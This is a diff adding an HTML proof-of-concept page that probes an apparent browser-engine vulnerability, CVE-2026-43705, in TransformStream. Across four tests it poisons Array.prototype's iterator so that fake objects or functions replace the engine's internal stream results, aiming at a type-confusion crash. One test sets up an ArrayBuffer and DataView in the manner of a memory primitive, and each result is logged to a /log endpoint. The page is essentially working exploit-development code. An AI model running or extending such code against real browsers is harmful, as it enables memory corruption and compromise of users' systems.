@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>CVE Deep Analysis</title></head>
+<body>
+<div id="log"></div>
+<script>
+var el = document.getElementById('log');
+function log(m, c) {
+    var d = document.createElement('div');
+    d.className = c||'';
+    d.textContent = m;
+    el.appendChild(d);
+    try { var x = new XMLHttpRequest(); x.open('GET','/log?m='+encodeURIComponent(m),false); x.send(); } catch(e) {}
+}
+
+log('=== CVE-2026-43705 Deep Analysis ===');
+
+var orig = Array.prototype[Symbol.iterator];
+
+// KEY INSIGHT: Only poison results[0], leave results[1] and results[2] as real streams
+// This way dynamicDowncast succeeds for readable/writable
+// But results[0] (strategy/controller) is our fake object
+
+log('Test A: Only poison index 0 (strategy)...');
+try {
+    Array.prototype[Symbol.iterator] = function() {
+        var a = this, i = 0;
+        return { next: function() {
+            if (i >= a.length) return {done:true};
+            var v = a[i];
+            // Only replace index 0 - indices 1,2 are real streams
+            if (a.length === 3 && i === 0) {
+                v = { fake: true };
+                log('Poisoned index 0 with fake object', 'y');
+            }
+            i++;
+            return {value:v, done:false};
+        }};
+    };
+    var ts = new TransformStream();
+    log('SURVIVED! TransformStream created with fake strategy!', 'g');
+    log('typeof ts.readable: ' + typeof ts.readable, 'g');
+    log('typeof ts.writable: ' + typeof ts.writable, 'g');
+    try {
+        var r = ts.readable;
+        log('readable: ' + r, 'g');
+    } catch(e) { log('readable access: ' + e, 'r'); }
+    try {
+        var w = ts.writable;
+        log('writable: ' + w, 'g');
+    } catch(e) { log('writable access: ' + e, 'r'); }
+} catch(e) {
+    if (e instanceof TypeError) log('TypeError (PATCHED)', 'pass');
+    else log('Exception: ' + e.constructor.name + ': ' + (e.message||'').substring(0,80), 'r');
+}
+Array.prototype[Symbol.iterator] = orig;
+
+// Test B: Replace index 0 with a more complex object
+log('');
+log('Test B: Replace index 0 with complex object...');
+try {
+    var targetAddr = new ArrayBuffer(8);
+    var view = new DataView(targetAddr);
+    view.setFloat64(0, 1.1);
+    
+    Array.prototype[Symbol.iterator] = function() {
+        var a = this, i = 0;
+        return { next: function() {
+            if (i >= a.length) return {done:true};
+            var v = a[i];
+            if (a.length === 3 && i === 0) {
+                // Object whose properties overlap with expected strategy layout
+                v = { size: function(){return 1}, highWaterMark: 1 };
+            }
+            i++;
+            return {value:v, done:false};
+        }};
+    };
+    var ts2 = new TransformStream();
+    log('SURVIVED with strategy-like object!', 'g');
+} catch(e) {
+    if (e instanceof TypeError) log('TypeError (PATCHED)', 'pass');
+    else log('Exception: ' + e.constructor.name + ': ' + (e.message||'').substring(0,80), 'r');
+}
+Array.prototype[Symbol.iterator] = orig;
+
+// Test C: Replace index 0 with a function (might be called as strategy)
+log('');
+log('Test C: Replace index 0 with a function...');
+try {
+    Array.prototype[Symbol.iterator] = function() {
+        var a = this, i = 0;
+        return { next: function() {
+            if (i >= a.length) return {done:true};
+            var v = a[i];
+            if (a.length === 3 && i === 0) {
+                v = function() { return 1; };
+                log('Poisoned index 0 with function', 'y');
+            }
+            i++;
+            return {value:v, done:false};
+        }};
+    };
+    var ts3 = new TransformStream();
+    log('SURVIVED with function strategy!', 'g');
+} catch(e) {
+    if (e instanceof TypeError) log('TypeError (PATCHED)', 'pass');
+    else log('Exception: ' + e.constructor.name + ': ' + (e.message||'').substring(0,80), 'r');
+}
+Array.prototype[Symbol.iterator] = orig;
+
+// Test D: The original full poison (should crash)
+log('');
+log('Test D: Full poison (indices 0,1,2) - should crash...');
+try {
+    Array.prototype[Symbol.iterator] = function() {
+        var a = this, i = 0;
+        return { next: function() {
+            if (i >= a.length) return {done:true};
+            var v = a[i];
+            if (a.length === 3 && i >= 1) v = {fake:true};
+            i++;
+            return {value:v, done:false};
+        }};
+    };
+    var ts4 = new TransformStream();
+    log('SURVIVED full poison (unexpected!)', 'g');
+} catch(e) {
+    if (e instanceof TypeError) log('TypeError (PATCHED)', 'pass');
+    else log('Exception: ' + e.constructor.name + ': ' + (e.message||'').substring(0,80), 'r');
+}
+Array.prototype[Symbol.iterator] = orig;
+
+log('');
+log('=== ANALYSIS COMPLETE ===');
+</script>
+</body>
+</html>
